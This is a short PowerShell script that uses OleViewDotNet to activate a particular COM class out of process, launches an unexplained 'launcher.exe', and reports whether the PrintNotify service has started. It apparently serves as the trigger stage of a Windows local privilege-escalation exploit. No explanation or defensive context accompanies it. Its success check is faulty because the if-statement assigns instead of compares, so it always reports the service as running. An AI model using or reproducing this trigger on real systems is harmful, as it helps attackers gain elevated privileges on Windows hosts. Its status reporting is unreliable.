Import-Module .\OleViewDotNet.psd1
(Get-ComDatabase .\com.db -SetCurrent) 3>$null
$x = Get-ComClass -Clsid '854a20fb-2d44-457d-992f-ef13785d2b51'
Start-Process -FilePath ".\launcher.exe"
$z = New-ComObject -Class $x -ClassContext LOCAL_SERVER -ErrorAction SilentlyContinue 
$sai = ((Get-Service -Name "PrintNotify").Status -eq "Running")
Write-Host "[+] " -NoNewLine -ForeGroundColor Green ; Write-Host "[!] Trigger launched: $sai";
if ($sai = "True") {
Write-Host "[+] " -NoNewLine -ForeGroundColor Green ; Write-Host "[+] PrintNotify Service is Start Running."
} else {
Write-Host "[+] " -NoNewLine -ForeGroundColor Green ; Write-Host "[+] PrintNotify Service is not running."
}
